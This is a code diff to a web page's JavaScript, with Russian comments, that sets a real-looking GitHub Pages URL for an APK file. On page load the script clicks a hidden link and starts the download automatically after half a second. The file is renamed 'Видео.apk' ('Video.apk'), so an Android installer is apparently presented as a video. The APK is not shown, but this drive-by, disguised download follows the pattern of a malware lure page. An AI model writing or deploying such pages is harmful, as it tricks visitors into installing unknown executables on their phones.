@@ -55,37 +55,36 @@
     <script>
         // --- 🔑 КЛЮЧЕВАЯ КОНФИГУРАЦИЯ ---
         
-        // 1. Укажите полный URL вашего APK-файла (ЗАМЕНИТЕ АДРЕС!)
-        const repoBaseUrl = 'https://username.github.io/repo-name/'; 
+        // 1. Установлен ваш реальный URL репозитория
+        // https://[username].github.io/[repo-name]/
+        const repoBaseUrl = 'https://94kz5hfdb-netizen.github.io/test/'; 
+        
+        // 2. Полный путь к файлу APK
         const apkUrl = repoBaseUrl + 'downloads/test.apk'; 
         const apkFilename = 'Видео.apk'; 
         
         // ------------------------------------
 
-        // 2. Функция для запуска скачивания
+        // Функция для запуска скачивания
         function startDownload() {
-            // Создаем невидимую ссылку (<a>) в DOM
             const link = document.createElement('a');
             link.href = apkUrl;
             link.download = apkFilename; 
             
-            // "Кликаем" по ссылке, что инициирует диалог скачивания APK (как на {D241F94D-1735-495F-AB94-DBE756D001AB}.png)
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
 
-            // Обновляем страницу после начала скачивания
             document.querySelector('h1').textContent = "Загрузка началась!";
             document.querySelector('.spinner').style.display = 'none';
         }
 
-        // 3. Запускаем скачивание сразу после загрузки страницы
         window.onload = function() {
             // Устанавливаем ссылку для ручного скачивания
             document.getElementById('manual_link').href = apkUrl;
             document.getElementById('filename').textContent = apkFilename;
             
-            // Запускаем автоматическое скачивание через небольшую задержку (0.5 секунды)
+            // Запускаем автоматическое скачивание через небольшую задержку
             setTimeout(startDownload, 500); 
         };
     </script>
